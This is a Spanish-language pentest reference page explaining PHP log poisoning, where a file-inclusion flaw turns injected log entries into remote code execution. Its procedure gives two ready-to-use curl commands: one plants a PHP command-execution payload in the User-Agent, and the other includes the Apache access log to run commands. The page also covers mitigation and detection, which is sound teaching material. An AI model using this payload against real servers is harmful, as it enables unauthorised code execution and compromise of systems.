---
topic: Envenenamiento de logs PHP
tags: [web, php, lfi, log-poisoning, rce]
---

# Envenenamiento de logs PHP

[🌐 English](php-log-poisoning.en.md) | **Español**

## Concepto

Una aplicación escribe entrada del usuario (User-Agent, URL, parámetro) en un archivo de log y luego permite incluir ese archivo. El atacante introduce código PHP en el log y lo ejecuta mediante la inclusión.

## Cuándo aplica

- LFI que puede leer `access.log` o un log propio.
- Aplicación que registra cabeceras sin sanear.
- Log dentro del webroot o accesible por la inclusión.

## Procedimiento

1. Confirmar la inclusión de archivos y la ruta del log.
2. Enviar una petición con PHP en el `User-Agent`.
3. Incluir el log con el parámetro vulnerable.
4. Ejecutar un comando inocuo antes de una shell.

```bash
curl -s http://<HOST>/ -A '<?php system($_GET["c"]); ?>'
curl -s "http://<HOST>/index.php?page=../../var/log/apache2/access.log&c=id"
```

## Variantes

- `/var/log/apache2/access.log`, `error.log`, `auth.log`.
- Logs de aplicación en `storage/logs`.
- `php://input` o `data://` si están habilitados.
- Envenenar un archivo de sesión.

## Limitaciones

- El log debe ser legible por el usuario web.
- La inclusión no debe añadir sufijos.
- Los caracteres pueden ser codificados por el servidor.

## Mitigación y detección

- No incluir archivos controlables por el usuario.
- Sanear y codificar los datos antes de registrarlos.
- Guardar logs fuera del webroot y con permisos restrictivos.
- Alertar de PHP en cabeceras y de inclusiones de logs.

## Referencias

- <https://owasp.org/www-community/attacks/Log_Injection>
- <https://www.php.net/manual/en/security.filesystem.php>
- <https://attack.mitre.org/techniques/T1190/>
